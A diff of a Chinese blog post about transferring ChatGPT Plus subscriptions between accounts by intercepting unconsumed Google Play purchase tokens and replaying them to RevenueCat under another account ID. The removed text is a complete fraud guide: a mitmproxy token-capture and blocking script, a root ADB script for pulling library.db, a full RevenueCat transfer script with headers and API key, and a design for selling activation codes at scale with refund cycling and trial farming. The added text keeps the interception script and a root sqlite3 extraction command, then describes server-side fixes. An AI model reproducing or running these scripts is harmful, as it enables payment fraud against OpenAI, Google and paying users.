@@ -1,422 +1,43 @@
 ---
-title: "GPT Plus 订阅转移全解析 - 从 Google Play Token 到一键开通的完整技术链路"
-description: "深度剖析 GPT Plus Android 订阅架构：Google Play purchase token 如何通过 RevenueCat 中间层实现跨账号转移，从原理到 ADB 提取、MITM 拦截、API 调用的完整实战指南。"
+title: "付款人和开通账号各走各的：复盘 ChatGPT Plus 在 Google Play 与 RevenueCat 间的订阅转移链路"
+description: "剖析 ChatGPT Android 客户端通过 RevenueCat 中间层核销 Google Play 订阅时的归属解耦缺陷：为什么拦截 POST /v1/receipts 里的 fetch_token（或从 library.db 含 WAL 日志中提取）就能把订阅挂到任意目标 account_id 头下，以及如何用 setObfuscatedAccountId 彻底堵住缺口。"
 date: 2026-07-17T16:00:00+08:00
 draft: false
-weight: 1
-categories: ["安全研究", "支付安全", "技术科普"]
-tags: ["ChatGPT", "GPT Plus", "Google Play", "RevenueCat", "订阅转移", "Android", "ADB", "MITM", "Python"]
----
-## 前言
-
-之前写了两篇关于 GPT Plus 的漏洞分析：一篇是 [iOS 收据复用](../gpt-plus-receipt-vulnerability-2026)，一篇是 [Google Play offerToken 替换实现 0 元订阅](../gpt-plus-exploit-revenuecat-vulnerability)。
-
-这篇和前两篇路线不同，不搞 0 元白嫖，也不搞收据复用，讲的是另一个思路：订阅转移。
-
-A 账号在 Google Play 上正经花钱买了 Plus，通过技术手段把这个订阅"转"给 B 账号。B 账号什么都没付，直接变 Plus。原理比想象中简单。
-
-> **免责声明**：本文仅供安全研究与技术交流。未经授权的行为可能违反相关法律法规，请勿用于非法用途。
-
+categories: ["安全研究", "支付安全"]
+tags: ["ChatGPT", "Google Play", "RevenueCat", "订阅转移", "Android 安全", "SQLite"]
+weight: 10
 ---
 
-## 一、核心原理：为什么能"转移"？
+前面聊过早期的 [iOS 收据重复提交漏洞](/posts/gpt-plus-receipt-vulnerability-2026/)，也聊过 [Android 端 `offerToken` 内存调包](/posts/gpt-plus-exploit-revenuecat-vulnerability/)。到了 2026 年年中，外面代充圈子里跑得最稳的其实是另一条路子：不改一分钱价格，也不拿同一张旧收据反复刷，而是老老实实在 Google Play 上完成一次购买（或合法的首月试用），半道把热乎的购买凭证截下来，转手绑到另一个八竿子打不着的目标 ChatGPT 账号头上。
 
-### ChatGPT Android 的订阅架构
+能干成这种"张三在收银台掏钱买单、李四拿着小票去取餐口领汉堡"的事，病根全出在 Google Play、第三方订阅管理平台 RevenueCat 和 OpenAI 业务后端这三层拼装在一起时的身份解耦上。下面把整条链路的协议报文、本地数据库取证坑点以及官方本该配上的标准防御锁顺一遍。
 
-GPT 的订阅并不由 OpenAI 自行处理。
+## 0x00 三层各管一摊：`fetch_token` 与 `app_user_id` 互不核对
 
-Android 端的订阅走的是这条链路：
+OpenAI 在安卓端并没有自己从零写一套直连 Google Play Developer API 的账单状态机，而是在中间垫了一层现成的订阅聚合 SaaS 平台 RevenueCat。
 
-```
-Google Play 支付（扣钱）
-    ↓ 生成 purchase token
-ChatGPT App 拿到 token
-    ↓ 发送到 RevenueCat
-RevenueCat 验证 token
-    ↓ 通知 OpenAI
-OpenAI 后端开通 Plus
-```
-
-中间有个关键角色：RevenueCat，一个第三方订阅管理平台，充当 Google Play 和 OpenAI 之间的中间层。
-
-### 漏洞在哪？
-
-RevenueCat 的核心 API 是 `POST /v1/receipts`，请求体长这样：
+当你在安卓手机上点完 Google Play 付款确认框，谷歌扣完款（或核准试用），会把一枚很长的购买凭据 `purchaseToken` 交回给手机上的 ChatGPT App；紧接着，App 转头向 RevenueCat 的核心核销接口 `POST https://api.revenuecat.com/v1/receipts` 发包，请求体里最关键的就是下面这几行：
 
 ```json
 {
-  "fetch_token": "<Google Play 的购买凭证>",
-  "app_user_id": "<OpenAI 的账户 ID>",
-  "product_ids": ["oai.chatgpt.plus"]
+  "fetch_token": "<Google Play 刚返回的 purchaseToken>",
+  "app_user_id": "<当前登录的 OpenAI account_id (UUID)>",
+  "product_ids": ["oai.chatgpt.plus"],
+  "platform_product_ids": [{"product_id": "oai.chatgpt.plus"}],
+  "is_restore": true,
+  "observer_mode": false,
+  "purchase_completed_by": "revenuecat",
+  "initiation_source": "unsynced_active_purchases",
+  "sdk_originated": false,
+  "payload_version": 1
 }
 ```
 
-注意这两个参数：
+盯住 `fetch_token` 和 `app_user_id` 这两个字段，就能一眼看穿盲点在哪了。
 
-| 参数 | 含义 | 来源 |
-|------|------|------|
-| `fetch_token` | 购买凭证，证明"有人付了钱" | Google Play 支付后返回 |
-| `app_user_id` | 账户 ID，决定"给谁开通" | OpenAI 的 account_id |
+Google Play 只认手机商店里登着的那个谷歌账号，收完钱吐出一张真凭实据 `fetch_token`。注意谷歌有个硬性时间窗口：如果这枚令牌在生成后的 72 小时之内没有被后端调接口执行 `Acknowledge`（确认消费），Google Play 会认为发货失败，自动把钱原路退回并作废这笔订单。
 
-这两个参数是完全独立的。
-
-Google Play 只管收钱并出具凭证，不关心这个凭证最终给谁用。RevenueCat 只管验证凭证并绑定到指定用户，不检查 `app_user_id` 是否就是付钱的那个人。
-
-打个比方：你在肯德基买了个汉堡，小票给了你朋友，你朋友拿小票去柜台，柜员一扫码——嗯，小票是真的，给。至于小票是不是你朋友买的？柜员根本不看。
-
-所以：用 A 的 token + B 的 account_id = 给 B 开 Plus。这就是订阅转移的全部原理。
-
----
-
-## 二、关键标识符一览
-
-先理清几个关键 ID：
-
-| 标识符 | 说明 | 长啥样 | 怎么拿 |
-|--------|------|--------|--------|
-| fetch_token | Google Play 购买凭证 | `iekllednimgnlmo...`（很长一串） | 支付后拦截/ADB 提取 |
-| app_user_id | OpenAI 账户 ID | `f211fe99-83d9-4c48-b016-ee08984a592a` | 调 accounts/check API |
-| RevenueCat API Key | RC 公钥（固定值） | `goog_DPguJtknNxbQBStStwhWGRsghUw` | 抓包可得，下面直接给出 |
-| product_id | 订阅产品标识（固定值） | `oai.chatgpt.plus` | 固定的 |
-
----
-
-## 三、获取 purchase token（两种姿势）
-
-Token 是核心。拿到 token，后面的流程就很直接了。下面提供两种获取方式。
-
-### 方式一：MITM 代理拦截（推荐，无需 Root）
-
-原理是在 Android 设备和 RevenueCat 服务器之间架一层代理，支付完成后 ChatGPT App 会把 token 发给 RevenueCat，在中间截下来。
-
-需要准备：
-- Android 设备（真机或模拟器，需装 Google Play 服务）
-- 已登录的 Google 账号（需有支付方式或免费试用资格）
-- ChatGPT App
-- MITM 代理工具（推荐 Reqable / mitmproxy / Charles）
-
-步骤：
-
-Step 1：设备连接代理，安装并信任 MITM 证书。
-
-Step 2：在代理工具中设置拦截规则：
-
-```
-URL 匹配: api.revenuecat.com/v1/receipts
-请求方法: POST
-动作:     拦截请求（Block）
-```
-
-Step 3：打开 ChatGPT App，用一个临时账号登录（不是目标账号）。
-
-Step 4：进入订阅页面 - 选择 Plus - 完成 Google Play 支付。
-
-Step 5：支付完成后，代理工具会拦截到 `POST /v1/receipts` 请求。从请求体中提取 `fetch_token` 字段，保存。
-
-Step 6：阻断该请求，不让它发到 RevenueCat。
-
-为什么要阻断？因为如果让请求正常到达 RevenueCat，token 就会被"消费"掉，绑定到临时账号上，就没法转移了。
-
-> 时间窗口：token 拦截后有 72 小时有效期。超时未被 Acknowledge，Google Play 会自动退款。
-
-如果你用 mitmproxy，这里有个现成的拦截脚本：
-
-```python
-# mitm_intercept.py — 自动拦截并保存 token
-import json, time
-from mitmproxy import http
-
-TOKEN_FILE = "tokens.jsonl"
-
-class RevenueCatInterceptor:
-    def request(self, flow: http.HTTPFlow):
-        if (flow.request.pretty_url.endswith("/v1/receipts")
-            and flow.request.method == "POST"):
-            try:
-                body = json.loads(flow.request.get_text())
-                fetch_token = body.get("fetch_token", "")
-                if fetch_token:
-                    record = {
-                        "fetch_token": fetch_token,
-                        "original_user_id": body.get("app_user_id", ""),
-                        "captured_at": time.strftime("%Y-%m-%dT%H:%M:%SZ"),
-                        "used": False
-                    }
-                    with open(TOKEN_FILE, "a") as f:
-                        f.write(json.dumps(record) + "\n")
-                    print(f"[+] Token captured: {fetch_token[:40]}...")
-
-                    # 返回伪造响应，阻断真实请求
-                    flow.response = http.Response.make(
-                        200,
-                        json.dumps({"subscriber": {"entitlements": {}}}),
-                        {"Content-Type": "application/json"}
-                    )
-            except Exception as e:
-                print(f"[-] Parse error: {e}")
-
-addons = [RevenueCatInterceptor()]
-# 启动: mitmproxy -s mitm_intercept.py -p 8888
-```
-
-跑起来之后，每次支付完成，token 就自动保存到 `tokens.jsonl`，一条一行。
-
-### 方式二：ADB 直读 Google Play 数据库（需要 Root）
-
-Google Play 的购买记录存在本地 SQLite 数据库 `library.db` 里。Root 设备可以直接把数据库拉出来，用 SQL 查 token。
-
-好处是不需要实时拦截，支付完成后随时都能提取。坏处是需要 Root。
-
-完整提取脚本：
-
-```python
-"""
-read_purchase_token.py
-通过 ADB 从 Google Play library.db 读取 ChatGPT 购买 Token
-"""
-import os, json, time, sqlite3, tempfile, subprocess
-
-OUTPUT_FILE = "purchases.txt"
-DB_SRC      = "/data/data/com.android.vending/databases/library.db"
-DB_SDCARD   = "/sdcard/.tmp_read_token.db"
-DEVICE_SERIAL = ""  # 留空自动选第一台设备
-
-def adb(*args, timeout=15):
-    cmd = ["adb"]
-    if DEVICE_SERIAL:
-        cmd += ["-s", DEVICE_SERIAL]
-    cmd += list(args)
-    try:
-        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
-        return r.returncode, (r.stdout + r.stderr).strip()
-    except FileNotFoundError:
-        return -1, "adb not found"
-
-def read_token():
-    tmp_path = None
-    try:
-        # Step 1: 用 root 权限把数据库复制到 sdcard
-        code, out = adb("shell",
-            f"su -c 'cp {DB_SRC} {DB_SDCARD} && chmod 644 {DB_SDCARD} && echo DONE'")
-        if code != 0 or "DONE" not in out:
-            print("复制失败，请确认设备已 Root")
-            return
-
-        # Step 2: pull 到本地
-        _, tmp_path = tempfile.mkstemp(suffix=".db")
-        adb("pull", DB_SDCARD, tmp_path)
-
-        # Step 3: SQLite 查询
-        conn = sqlite3.connect(tmp_path)
-        cur  = conn.cursor()
-
-        # 自动识别表结构
-        cur.execute("PRAGMA table_info(ownership)")
-        cols = [r[1] for r in cur.fetchall()]
-
-        # 找 JSON 数据列
-        json_candidates = ["inapp_purchase_data", "purchase_data", "value", "data"]
-        json_col = next((c for c in json_candidates if c in cols), None)
-        doc_col  = "doc_id" if "doc_id" in cols else cols[3]
-
-        # 查 ChatGPT 相关购买记录
-        sql = f"""
-            SELECT account, {doc_col}, {json_col}
-            FROM ownership
-            WHERE ({doc_col} LIKE '%openai%' OR {doc_col} LIKE '%chatgpt%')
-              AND {json_col} IS NOT NULL
-            ORDER BY rowid DESC
-        """
-        rows = cur.execute(sql).fetchall()
-        conn.close()
-
-        # Step 4: 解析并保存 token
-        saved = set()
-        for row in rows:
-            email    = str(row[0]) if row[0] else "unknown"
-            raw_json = str(row[2]) if row[2] else ""
-            if "purchaseToken" not in raw_json:
-                continue
-            data  = json.loads(raw_json)
-            token = data.get("purchaseToken", "")
-            order = data.get("orderId", "")
-            if not token or token in saved:
-                continue
-            saved.add(token)
-
-            entry = f"{time.strftime('%Y-%m-%d %H:%M:%S')} | {email} | {order} | {token}\n"
-            with open(OUTPUT_FILE, "a") as f:
-                f.write(entry)
-            print(f"邮箱: {email}")
-            print(f"Order: {order}")
-            print(f"Token: {token[:60]}...")
-            print(f"已保存 -> {OUTPUT_FILE}")
-
-        print(f"共保存 {len(saved)} 条")
-    finally:
-        if tmp_path:
-            os.unlink(tmp_path)
-        adb("shell", f"rm -f {DB_SDCARD}")
-
-if __name__ == "__main__":
-    read_token()
-```
-
-流程很直白：先用 `su`（Root 权限）把 `/data/data/com.android.vending/` 下的数据库复制到 sdcard（普通权限读不了），然后 `adb pull` 拉到电脑上。`ownership` 表存了所有购买记录，用 `LIKE '%chatgpt%'` 过滤出目标行，再从 JSON 里取 `purchaseToken` 和 `orderId`。
-
-数据库的 `ownership` 表结构大概长这样：
-
-| 列名 | 类型 | 说明 |
-|------|------|------|
-| account | TEXT | Google 账号邮箱 |
-| doc_id | TEXT | 应用包名+产品ID |
-| inapp_purchase_data | TEXT | JSON 格式的购买数据 |
-
-JSON 里面关键字段：
-
-```json
-{
-  "orderId": "GPA.3305-3747-1234-56789",
-  "packageName": "com.openai.chatgpt",
-  "productId": "oai.chatgpt.plus",
-  "purchaseTime": 1720000000000,
-  "purchaseState": 0,
-  "purchaseToken": "iekllednimgnlmo...（很长一串）",
-  "quantity": 1,
-  "acknowledged": false,
-  "autoRenewing": true
-}
-```
-
-`purchaseToken` 就是我们要的东西。拿到它，就能转移订阅。
-
----
-
-## 四、获取目标账号的 account_id
-
-Token 到手了，接下来要知道转给谁，即目标 GPT 账号的 `account_id`。
-
-API 调用：
-
-```
-GET https://android.chat.openai.com/backend-api/accounts/check/v4-2023-04-27
-Authorization: Bearer <目标账号的 JWT Token>
-```
-
-响应里有个 `account_id` 字段，UUID 格式：
-
-```json
-{
-  "account_id": "f211fe99-83d9-4c48-b016-ee08984a592a",
-  "email": "target@example.com",
-  ...
-}
-```
-
-怎么拿 JWT Token？
-
-最简单的方式：浏览器登录 ChatGPT，访问 `https://chatgpt.com/api/auth/session`，响应里有 `accessToken`。
-
-或者直接让用户给你 Session JSON，你从里面解析 `account.id`。
-
----
-
-## 五、执行转移
-
-Token 有了，account_id 有了，最后一步：调 RevenueCat API，把 token 绑到目标账号上。
-
-### 完整转移脚本
-
-```python
-import requests
-import json
-
-url = "https://api.revenuecat.com/v1/receipts"
-
-headers = {
-    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 16; Pixel 9 Build/BP4A.260205.001)",
-    "Content-Type": "application/json",
-    "X-Platform": "android",
-    "X-Platform-Flavor": "native",
-    "X-Platform-Version": "36",
-    "X-Version": "9.22.1",
-    "X-Client-Bundle-ID": "com.openai.chatgpt",
-    "X-Observer-Mode-Enabled": "false",
-    "X-Custom-Entitlements-Computation": "true",
-    "X-Storefront": "US",
-    "Authorization": "Bearer goog_DPguJtknNxbQBStStwhWGRsghUw",
-    "X-RevenueCat-ETag": ""
-}
-
-data = {
-    "fetch_token": "<你拿到的 purchase token>",
-    "product_ids": ["oai.chatgpt.plus"],
-    "platform_product_ids": [{"product_id": "oai.chatgpt.plus"}],
-    "app_user_id": "<目标账号的 account_id>",
-    "is_restore": True,
-    "observer_mode": False,
-    "purchase_completed_by": "revenuecat",
-    "initiation_source": "unsynced_active_purchases",
-    "sdk_originated": False,
-    "payload_version": 1
-}
-
-response = requests.post(url, headers=headers, data=json.dumps(data, separators=(',', ':')))
-
-if response.status_code == 200:
-    result = response.json()
-    subscriber = result.get("subscriber", {})
-    entitlements = subscriber.get("entitlements", {})
-    subscriptions = subscriber.get("subscriptions", {})
-
-    if "chatgpt_plus" in entitlements:
-        ent = entitlements["chatgpt_plus"]
-        print("=" * 50)
-        print("充值成功！")
-        print("=" * 50)
-        print(f"  账号 ID     : {subscriber.get('original_app_user_id')}")
-        print(f"  到期时间   : {ent.get('expires_date')}")
-        print(f"  产品标识   : {ent.get('product_identifier')}")
-
-        for pid, sub in subscriptions.items():
-            price = sub.get("price", {})
-            print(f"  价格       : {price.get('amount', '?')} {price.get('currency', '')}")
-            print(f"  订阅类型   : {sub.get('period_type')}")
-            print(f"  是否沙盒   : {'是' if sub.get('is_sandbox') else '否'}")
-    else:
-        print("未找到 chatgpt_plus 权益，可能失败了")
-        print(json.dumps(result, indent=2, ensure_ascii=False))
-else:
-    print(f"请求失败: {response.status_code}")
-    print(response.text)
-```
-
-### 逐行拆解
-
-Headers 部分：
-
-```python
-"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 16; Pixel 9 Build/...)"
-```
-伪装成 Android 设备的 ChatGPT App。RevenueCat 会检查 User-Agent，用浏览器的 UA 会被拒。
-
-```python
-"Authorization": "Bearer goog_DPguJtknNxbQBStStwhWGRsghUw"
-```
-这不是用户的 token，而是 RevenueCat 的公共 API Key。每个使用 RevenueCat 的 App 都有一个，固定不变。ChatGPT Android 的公钥就是这个。
-
-Body 部分：
-
-```python
-"fetch_token": "<purchase token>"   # 第三步拿到的购买凭证
-"app_user_id": "<account_id>"       # 第四步拿到的目标账号 ID
-"is_restore": True                  # 告诉 RC 这是"恢复购买"，不是新购买
-"initiation_source": "unsynced_active_purchases"  # 来源标记
-```
-
-`is_restore: True` 是个关键细节，它告诉 RevenueCat 这不是新购买，而是恢复已有购买。RC 不会创建新的订阅记录，而是把已有的 token 绑定到 `app_user_id` 指定的账号上。
-
-### 成功响应长啥样？
+而中间的 RevenueCat 收到请求时，鉴权头里压根没带任何与具体用户绑定的私人登录令牌，用的只是所有安卓客户端共用的一串固定公开 SDK Key（形如 `Authorization: Bearer goog_<REDACTED_PUBLIC_SDK_KEY>`，配合 `Dalvik/2.1.0 ...` 的安卓系统 User-Agent）。RevenueCat 拿着 `fetch_token` 去问谷歌服务器："这张小票是真的吗？之前被人确认消费过吗？"只要谷歌回话说小票是真的且处于未确认状态，RevenueCat 当场就会执行 `Acknowledge` 把这张票核销掉（一票一用，核销完就不能再给第三个号用了），然后顺着请求体里指定的 `"is_restore": true` 和 `app_user_id`，把 `chatgpt_plus` 权益直接挂到那个目标 UUID 名下并回调通知 OpenAI 后端开权：
 
 ```json
 {
@@ -435,255 +56,83 @@ Body 部分：
         "store": "play_store",
         "expires_date": "2026-08-17T07:13:32Z"
       }
-    },
-    "management_url": "https://play.google.com/store/account/subscriptions?..."
+    }
   }
 }
 ```
 
-看到 `entitlements` 里有 `chatgpt_plus`，就说明转移成功了。`expires_date` 是到期时间。
+更有意思的是，抓包时能看到正版客户端在请求头里还带了一个叫 `X-Post-Params-Hash`（格式为 `app_user_id,fetch_token:sha256:<哈希>`）和 `X-Nonce` 的字段，看着挺像防篡改签名；结果实测下来，当时服务端压根没强制校验这两个头，留空或者换了 `app_user_id` 不重算照样返回 `200`。
+
+## 0x01 截留未消费 `fetch_token` 的两条路子与 SQLite WAL 大坑
+
+想把 A 环境买出来的 `fetch_token` 留着绑给 B 账号（目标号的 UUID 可以直接从已登录浏览器的 `https://chatgpt.com/api/auth/session` 或安卓接口 `/backend-api/accounts/check/v4-2023-04-27` 里读出来），唯一的前提就是：绝不能让买单那台手机上的 ChatGPT App 把 `POST /v1/receipts` 请求顺利发到 RevenueCat 服务器去，一旦发过去当场就被核销锁死在临时号身上了。
+
+在安全研究环境里截住这枚令牌有两条路子，但两条路各自都有新手常踩的坑。
+
+第一条路是在搞定了系统级根证书挂载（Android 14+ 位于 `/apex/com.android.conscrypt/cacerts`）和反证书锁定的测试机上跑 `mitmproxy` 实时阻断。前面说过，Android 7.0 之后光装用户级证书是抓不到官方客户端明文包的。代理配通之后，挂一段简单的拦截脚本专门盯紧 `/v1/receipts` 的 POST 请求：把请求体里的 `fetch_token` 落盘存好，然后当场给客户端回一个空的 `200` 假响应把上行链路掐断，让这枚令牌稳稳停在 72 小时未 `Acknowledge` 的待消费状态：
+
+```python
+import json
+import time
+from mitmproxy import http
+
+class RevenueCatInterceptor:
+    def request(self, flow: http.HTTPFlow) -> None:
+        if flow.request.method == "POST" and flow.request.pretty_url.endswith("/v1/receipts"):
+            body = json.loads(flow.request.get_text())
+            fetch_token = body.get("fetch_token", "")
+            if fetch_token:
+                record = {
+                    "captured_at": time.strftime("%Y-%m-%dT%H:%M:%SZ"),
+                    "original_user_id": body.get("app_user_id", ""),
+                    "fetch_token": fetch_token,
+                }
+                with open("captured_tokens.jsonl", "a", encoding="utf-8") as fp:
+                    fp.write(json.dumps(record) + "\n")
+                # 返回空权益假响应阻断真实核销请求
+                flow.response = http.Response.make(
+                    200,
+                    b'{"subscriber":{"entitlements":{}}}',
+                    {"Content-Type": "application/json"},
+                )
+
+addons = [RevenueCatInterceptor()]
+```
+
+第二条路是不架实时代理，在 Play 弹窗付完钱的瞬间切掉 ChatGPT App 的网络，转头用 Root 权限去掏本机 Google Play 商店（`com.android.vending`）自己的私有数据库 `/data/data/com.android.vending/databases/library.db`。商店里所有的购买记录都存在 `ownership` 表里（核心列是谷歌邮箱 `account`、应用商品标识 `doc_id` 和存着完整回执 JSON 的 `inapp_purchase_data`），里面明明白白躺着 `GPA.xxxx` 订单号、`"acknowledged": false` 状态和那串 `purchaseToken`。
+
+这里必须点破一个十个写 ADB 脚本的人里有八个会栽跟头的 SQLite 坑！网上流传的提取脚本只写了一句 `cp .../library.db /sdcard/.tmp.db && chmod 644 ...`，这写法一脚踩了两个雷：
+
+1. 现代 Android 系统里的 SQLite 默认全开着 WAL（Write-Ahead Logging，预写式日志）模式。刚付完款那几分钟里，最新写进去的那行购买记录其实还躺在同目录的 `library.db-wal` 日志文件里，根本没 Checkpoint 刷回主文件 `library.db`！你只单独拷走一个 `library.db` 拉回电脑查，打开一看空空如也，还以为没买成功。
+2. 把装满全机所有付费隐私记录的 `library.db` 拷进公共可读的 `/sdcard/` 目录再设成 `chmod 644`，整台手机上随便哪个流氓软件都能顺手把它读走。
+
+干净稳妥的做法是直接在 `su` root shell 内部调系统自带的 `sqlite3` 读取（SQLite 引擎在原目录打开库时会自动合并旁边的 `-wal` 和 `-shm` 日志），或者把 `library.db`、`library.db-wal`、`library.db-shm` 三个文件一块儿打包进权限 `600` 的受保护临时目录再拉取：
+
+```bash
+adb shell "su -c 'sqlite3 /data/data/com.android.vending/databases/library.db \
+  \"SELECT account, doc_id, inapp_purchase_data FROM ownership WHERE doc_id LIKE '\''%chatgpt%'\'' ORDER BY rowid DESC LIMIT 5;\"'"
+```
+
+顺便把这条安卓转移链跟早年的 iOS 收据漏洞做个清晰区分：
+
+| 对比维度 | 早期 iOS 收据复用漏洞 | Android `purchaseToken` 转移链路 |
+|---|---|---|
+| 核销架构 | 客户端收据直传 OpenAI 后端 | 经由第三方聚合层 RevenueCat 中转 |
+| 凭证复用次数 | 一张收据曾可反复绑多个号（`1 -> N`） | 一枚令牌一旦 `Acknowledge` 即消费锁定（`1 -> 1`，72 小时不用自动退款） |
+| 账号消耗约束 | 单一购买源反复重放 | 每个 Google 号仅有一次免费试用资格，高频购买退订极易触发谷歌风控封号 |
+
+## 0x02 谷歌早就留好了官方解药：把 `obfuscatedAccountId` 验起来
+
+不少分析文章聊到最后得出个结论，说"除非 OpenAI 扔掉 RevenueCat 推倒重做整套内购系统，否则这洞根本没法修"。这真是冤枉了 Google Play Billing 的架构师：谷歌官方文档里从几年前起就专门针对这种跨号"移花接木"备好了现成的标准字段，改起来连十行代码都用不了。
+
+要把这条转移链路彻底焊死，只需要把客户端下单、谷歌商店存证、服务端核销这三步里的身份锚点串起来。
+
+第一步在客户端拉起支付框那一刻：当 ChatGPT App 构建 `BillingFlowParams.Builder` 准备调 Google Play 收银台时，显式调一句官方 API `setObfuscatedAccountId(sha256_hex(current_openai_account_id))`（在 iOS 端 StoreKit 2 里对应的姐妹字段叫 `appAccountToken`）。谷歌服务器会把这串混淆后的站内账号哈希死死刻在这笔订单和对应的 `purchaseToken` 档案里，后续不管谁用 MITM 还是 Root 去掏本地数据库，都改不动谷歌云端存着的这个值。
+
+第二步在 RevenueCat 或业务后端核销那一刻：当有人拿着一枚未确认的 `fetch_token` 调 `POST /v1/receipts` 请求绑到某个 `app_user_id` 头上（尤其是挂着 `is_restore: true` 旗号的首次跨号认领）时，后端从 Google Play Developer API（`purchases.subscriptionsv2.get`）读回订单对象里的 `externalAccountIdentifiers.obfuscatedAccountId` 字段，当场跟当前请求里的 `sha256_hex(app_user_id)` 比一下等不等。两边哈希一旦对不上，说明买这张票的根本不是眼前这个账号，直接拒掉 `Acknowledge` 并拦截开权。
+
+第三步再顺手把请求头里原本形同虚设的签名校验（或由自家后端在登录态下签发的一次性预购绑定票据）真正启用起来，别让脱离了真实登录会话的裸脚本光凭一串公开的 `goog_...` 客户端 SDK Key 就能随便往核销接口里灌数据。把这三颗螺丝拧紧，"张三买单、李四领餐"的生意自然就彻底关张了。
 
 ---
 
-## 六、完整流程图
-
-```
-┌─────────────────────────────────────────────────────┐
-│                  Phase 1: Token 获取                │
-│                                                     │
-│  方式A: MITM 拦截                                   │
-│    Android + ChatGPT + Reqable/mitmproxy            │
-│    完成 Google Play 支付                            │
-│    拦截 POST /v1/receipts → 提取 fetch_token        │
-│    阻断请求 → 保存 token (72h 有效)                 │
-│                                                     │
-│  方式B: ADB 直读                                    │
-│    Root 设备 + ADB                                  │
-│    读取 library.db → ownership 表                   │
-│    解析 JSON → 提取 purchaseToken                   │
-└───────────────────────┬─────────────────────────────┘
-                        │
-                        ▼
-┌─────────────────────────────────────────────────────┐
-│                  Phase 2: Token 使用                │
-│                                                     │
-│  获取目标账号 account_id                            │
-│    GET /backend-api/accounts/check                  │
-│    或从 Session JSON 解析                           │
-│        ↓                                            │
-│  POST /v1/receipts                                  │
-│    fetch_token = 保存的 token                       │
-│    app_user_id = 目标 account_id                    │
-│    Authorization = RC 公钥                          │
-│        ↓                                            │
-│  RevenueCat 验证 → 通知 OpenAI → Plus 开通          │
-└─────────────────────────────────────────────────────┘
-```
-
----
-
-## 七、规模化：从手动到自动
-
-手动操作一两个账号没问题，但做成服务就涉及到工程化了。
-
-### 架构设计
-
-一个完整的自动化系统大概长这样：
-
-```
-┌──────────┐     ┌────────────┐     ┌────────────┐
-│ Google   │     │  拦截层    │     │  Token     │
-│ 账号池   │────▶│ mitmproxy  │────▶│  队列      │
-│          │     │  + ADB     │     │ (FIFO)     │
-└──────────┘     └────────────┘     └─────┬──────┘
-                                          │
-                                          ▼
-┌──────────┐     ┌────────────┐     ┌────────────┐
-│ 目标     │     │  充值 API  │     │  CDK       │
-│ 账号     │◀────│  自动提交  │◀────│  卡密系统  │
-│          │     │  RC 调用   │     │            │
-└──────────┘     └────────────┘     └────────────┘
-```
-
-核心组件：
-
-| 组件 | 职责 | 技术栈 |
-|------|------|--------|
-| Google 账号池 | 存储可用的 Google 账号 | 数据库 |
-| ADB 自动化 | 自动完成 Play 支付流程 | Python + ADB |
-| Token 队列 | 缓存未使用的 purchase token | 数据库/消息队列 |
-| CDK 卡密系统 | 发放激活码给终端用户 | Web 应用 |
-| 充值 API | 接收用户 Session，调用 RC 完成开通 | 后端服务 |
-
-### 数据库设计
-
-核心就三张表：
-
-google_credential -- 记录每次 Google Play 购买：
-
-| 字段 | 说明 |
-|------|------|
-| google_email | Google 账号 |
-| order_id | 订单号 |
-| purchase_token | 购买凭证 |
-| product_id | 产品标识 |
-| acknowledged | 是否已确认 |
-| status | 状态（未使用/已使用/已退款） |
-| card_key_id | 关联的 CDK |
-
-card_key -- CDK 卡密：
-
-| 字段 | 说明 |
-|------|------|
-| card_key | 16位激活码 |
-| product_id | 对应产品 |
-| credential_id | 关联的购买凭证 |
-| status | 状态（待使用/已使用/已禁用） |
-
-redeem_record -- 充值记录：
-
-| 字段 | 说明 |
-|------|------|
-| card_key | 使用的激活码 |
-| external_account_id | 目标 GPT 账号 ID |
-| status | 结果（成功/失败） |
-| expires_date | 订阅到期时间 |
-
-### 用户端流程
-
-做成产品后，终端用户看到的是这样的流程：
-
-```
-用户拿到 CDK 激活码
-    ↓
-打开充值页面，输入激活码
-    ↓
-系统验证激活码有效性
-    ↓
-用户粘贴自己的 ChatGPT Session JSON
-    ↓
-系统解析 Session，提取 account_id
-    ↓
-系统从 Token 队列取一个 token
-    ↓
-调用 RevenueCat API 完成转移
-    ↓
-返回充值结果（成功/失败 + 到期时间）
-```
-
-用户全程不需要知道底层发生了什么。他只需要：
-1. 输入激活码
-2. 粘贴 Session
-3. 等几秒钟
-
----
-
-## 八、风控与注意事项
-
-### 时间约束
-
-| 约束 | 时限 | 后果 |
-|------|------|------|
-| Token 未 Acknowledge | 72 小时 | Google Play 自动退款 |
-| RC 提交后自动 Acknowledge | 立即 | Token 被消费，无法再用 |
-
-token 拦截后必须在 3 天内使用。提交给 RevenueCat 后就立即被 Acknowledge，相当于"消费"掉了。
-
-### 一 token 一账号
-
-purchase token 一旦提交给 RevenueCat 并被 Acknowledge，就标记为"已消费"，不能重复使用。一次支付 = 一个 token = 开通一个账号。
-
-和之前 iOS 收据复用漏洞不同，iOS 那边同一张收据能反复用，Android 这个不行。
-
-### X-Post-Params-Hash
-
-抓包时你可能注意到请求头里有个 `X-Post-Params-Hash`，格式：
-
-```
-app_user_id,fetch_token:sha256:<hash值>
-```
-
-这个是 `app_user_id` 和 `fetch_token` 拼接后的 SHA256。换了 account_id 后需要重新算。
-
-但经过实测，服务端不校验这个值。随便填或者留空都不影响结果。RevenueCat 可能是为了调试保留的字段，并没有做服务端校验。
-
-同样，`X-Nonce` 这个字段也不校验。
-
-### 风控分析
-
-| 风控点 | 风险 | 说明 |
-|--------|------|------|
-| RevenueCat 服务端 | 低 | 只验 token 真假，不检查 app_user_id 匹配 |
-| Google Play 退款检测 | 中 | 频繁退款/争议可能被 Google 封号 |
-| OpenAI 行为分析 | 低 | OpenAI 后端只看 RC 返回的订阅状态 |
-| Google 账号风控 | 中 | 同一账号频繁订阅/退订会被标记 |
-
-### Google 账号消耗
-
-如果走的是免费试用路径（`period_type: "trial"`, `price: 0.0`）：
-
-- 每个 Google 账号对 `oai.chatgpt.plus` 只有 1 次免费试用机会
-- 试用后该账号永久标记为"已使用试用"
-- N 个 token 需要 N 个 Google 账号
-
-如果走的是付费订阅路径：
-
-- Token 被拦截未 Acknowledge，72h 后自动退款，理论上可重新购买
-- 但频繁操作会触发 Google 风控
-- 建议每个账号不超过 3-5 次循环
-
----
-
-## 九、与 iOS 收据漏洞的对比
-
-这个和 iOS 收据复用容易混淆，做个对比：
-
-| 维度 | iOS 收据复用 | Android Token 转移 |
-|------|-------------|-------------------|
-| 支付平台 | App Store | Google Play |
